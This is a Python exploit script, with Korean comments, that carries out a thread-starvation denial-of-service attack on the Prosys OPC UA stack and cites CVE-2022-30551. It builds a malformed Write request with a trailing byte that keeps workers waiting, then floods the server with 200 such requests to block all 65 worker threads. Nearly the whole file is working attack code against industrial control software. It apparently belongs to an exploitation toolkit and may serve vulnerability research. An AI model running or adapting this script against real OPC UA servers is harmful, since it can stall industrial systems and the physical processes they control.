# Threads Deadlock Attack
#   이 공격은 스레드 풀의 교착 상태를 유발하여 워커 스레드가 더 이상 사용할 수 없게 만듭니다.
#   Prosys OPC UA 스택은 기본적으로 65개의 워커 스레드를 사용하므로, 65개의 동시 요청을 보내면 모든 스레드가 영구적으로 차단될 수 있습니다.
#   CVE-2022-30551에서 설명된 내용 참고: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2022-30551.pdf

from protocol import *
from config import *
import time

def attack(server_details, num_requests=200):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 메시지 헤더 준비
    message_header = opcua.build_opcua_message_header()

    # 메시지 본문 준비
    message_body = b""
    message_body += b"\x01\x00"  # Type ID - Expanded Node ID, 네임스페이스 인덱스 0
    message_body += b"\xa1\x02"  # Write 요청
    message_body += OBJECT.build(opcua.auth_id)  # Auth 토큰
    message_body += b"\xff"  # 추가 바이트로 워커가 계속해서 더 많은 데이터를 기다리게 만듦

    # 데이터를 스레드 풀 대기 상태로 유지
    message_write_starvation = bytearray(message_header + message_body)

    # num_requests 번의 요청을 보냄
    print(f"[-] Sending MSG Request - Worker Wait Data Starvation x {num_requests} times")
    opcua.send_recv(message_write_starvation, num_requests, should_recv=False)

    # 모든 워커가 처리 중임을 확인하기 위해 잠시 대기
    print("[-] Sleeping 3 seconds to ensure all workers are busy")
    time.sleep(3)

    # 연결 종료
    print("[-] Closing connection")
    opcua.close()
